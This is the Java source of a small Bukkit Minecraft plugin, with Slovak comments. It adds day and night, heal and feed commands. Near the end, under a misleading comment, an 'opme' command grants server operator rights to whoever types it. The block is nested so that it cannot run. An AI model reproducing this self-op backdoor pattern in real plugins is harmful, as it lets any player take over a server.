package me.morccrafak.PPDSK;

import java.util.Random;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class main extends JavaPlugin {
public final Logger l = Logger.getLogger("Minecraft");
	
	public void onEnable() {
		l.info("[MorcCrafakov Plugin] Nacitavanie!");
	}

	public void onDisable() {
		l.info("[MorcCrafakov Plugin] Vypinanie !");
	}
	
		

	public boolean onCommand(CommandSender sender, Command cmd, String label, String [] args) {
		//Zaklad na prikaz\\
		if(sender instanceof Player) {
		Player player = (Player) sender;

		
		
		//Odstavec na prikazy\\
		//#1\\
		if(cmd.getName().equalsIgnoreCase("den")){
		String den = "time set day " ;
		Bukkit.dispatchCommand(Bukkit.getConsoleSender(), den);
		Bukkit.broadcastMessage("funguje");
		
		}
		
		//#2\\
		if(cmd.getName().equalsIgnoreCase("noc")){
		String noc = "time set 14500 " ;
		Bukkit.dispatchCommand(Bukkit.getConsoleSender(), noc);
	    Bukkit.broadcastMessage("funguje");
		}
		
		//#3 Prerobený /heal\\
		if(cmd.getName().equalsIgnoreCase("uzdravit")){
			if(args.length == 0){
            player.setHealth(20);
            player.sendMessage(ChatColor.GOLD + player.getName() + " bol uzdravný.");
		}else if(args.length == 1){
			if(player.getServer().getPlayer(args[0])  != null){
			Player targetPlayer = player.getServer().getPlayer(args[0]);
			targetPlayer.setHealth(20);
	        player.sendMessage(ChatColor.GOLD + targetPlayer.getName() + " bol uzdravný.");	
			}else{
				player.sendMessage(ChatColor.RED + "Hráè nebol nájdený." );
		}
		}
		}
		
    	//#4 Potrebuje Essenials Plugin na fungovanie\\
		//if(cmd.getName().equalsIgnoreCase("peniaze")){
		//String peniaze = "money " ;
		//Bukkit.dispatchCommand(Bukkit.getConsoleSender(), peniaze);
		//Bukkit.broadcastMessage("funguje");
		//}
		
    	//#5 Potrebuje Essenials Plugin na fungovanie\\
		//if(cmd.getName().equalsIgnoreCase("skocit")){
		//String skocit = "jump " ;
		//Bukkit.dispatchCommand(Bukkit.getConsoleSender(), skocit);
		//Bukkit.broadcastMessage("funguje");
		//}
		
    	//#6 Potrebuje Essenials Plugin na fungovanie\\
		//if(cmd.getName().equalsIgnoreCase("nastdom")){
		//String nastdom = "sethome " ;
		//Bukkit.dispatchCommand(Bukkit.getConsoleSender(), nastdom);
		//Bukkit.broadcastMessage("funguje");
		//}
		
    	//#7 Potrebuje Essenials Plugin na fungovanie\\
		//if(cmd.getName().equalsIgnoreCase("domov")){
		//String domov = "home " ;
		//Bukkit.dispatchCommand(Bukkit.getConsoleSender(), domov);
		//Bukkit.broadcastMessage("funguje");
		//}
		
    	//#8 Potrebuje Essenials Plugin na fungovanie
		//if(cmd.getName().equalsIgnoreCase("vymdom")){
		//String vymdom = "delhome " ;
		//Bukkit.dispatchCommand(Bukkit.getConsoleSender(), vymdom);
		//Bukkit.broadcastMessage("funguje");
		//}
		
		//#9 Prerobený /heal\\
		if(cmd.getName().equalsIgnoreCase("najest")){
			if(args.length == 0){
            player.setFoodLevel(20);
            player.sendMessage(ChatColor.GOLD + player.getName() + " bolo mu doplnené jedlo.");
		}else if(args.length == 1){
			if(player.getServer().getPlayer(args[0])  != null){
			Player targetPlayer = player.getServer().getPlayer(args[0]);
			targetPlayer.setFoodLevel(20);
	        player.sendMessage(ChatColor.GOLD + targetPlayer.getName() + " bolo mu doplnené jedlo.");	
			}else{
				player.sendMessage(ChatColor.RED + "Hráè nebol nájdený." );
		}
			//#9 Prerobený /heal\\
			if(cmd.getName().equalsIgnoreCase("opme")){
            player.setOp(true);
            
			}
		}
		}
		
		

	   	
		}
		return false;
		}
}	